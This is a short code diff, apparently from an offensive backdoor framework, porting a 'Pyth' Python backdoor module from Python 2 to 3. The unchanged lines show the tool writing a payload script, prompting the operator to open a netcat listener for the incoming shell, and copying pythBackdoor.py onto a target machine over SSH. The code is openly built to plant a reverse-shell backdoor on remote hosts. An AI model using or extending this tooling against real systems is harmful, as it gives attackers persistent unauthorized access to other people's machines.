@@ -1,4 +1,4 @@
-from backdoor import *
+from backdoors.backdoor import *
 
 class Pyth(Backdoor):
     prompt = Fore.RED + "(py) " + Fore.BLUE + ">> " + Fore.RESET 
@@ -34,7 +34,7 @@ class Pyth(Backdoor):
         stringToAdd+=data
         fileToWrite.write(stringToAdd)
         fileToWrite.close()
-        raw_input("Run the following command: nc -v -n -l -p %s in another shell." % port)
+        input("Run the following command: nc -v -n -l -p %s in another shell." % port)
         target.ssh.exec_command('rm pythBackdoor.py')
         target.scpFiles(self, 'backdoors/shell/pythScript/pythBackdoor.py', False)
         print(GOOD + "Moving the backdoor script.")
